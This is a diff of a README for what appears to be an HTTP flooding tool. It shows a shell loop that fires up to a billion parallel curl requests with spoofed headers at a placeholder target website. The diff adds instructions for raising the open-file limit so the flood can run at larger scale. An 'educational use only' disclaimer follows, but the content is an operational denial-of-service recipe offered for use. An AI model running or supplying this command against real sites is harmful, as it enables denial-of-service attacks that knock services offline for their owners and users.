@@ -15,8 +15,16 @@ If you don't want logs in your terminal and make the attacks faster, do this (**
 while (true); do seq 1 1000000000 | xargs -n1 -P 1000000000 curl -s -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com" > /dev/null; done;
 ```  
 
-**Note 1:** Reduce the numbers from **1000000000** if your system crashes. It's the number of parallel requests fired at once.  
-**Note 2:** To bypass **open file limit (No file descriptors available)** try out the solution in **https://epi052.github.io/feroxbuster-docs/docs/faq/no-file-descriptors/**  
+**Note 1:** Reduce the numbers from **1000000000** if your system crashes. It's the number of parallel requests fired at once. Or run the following code before running the above code...  
+```
+ulimit -n 10000000000
+```
+What the above code does is explained in **Note 2**.  
+**Note 2:** To bypass **open file limit (No file descriptors available)** try out the solutions in  
+**https://epi052.github.io/feroxbuster-docs/docs/faq/no-file-descriptors/**  
+**https://www.cyberciti.biz/faq/linux-increase-the-maximum-number-of-open-files/**  
+**https://discussions.apple.com/thread/2206502**  
+etc.  
 
 **IMPORTANT:**  
 THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!  
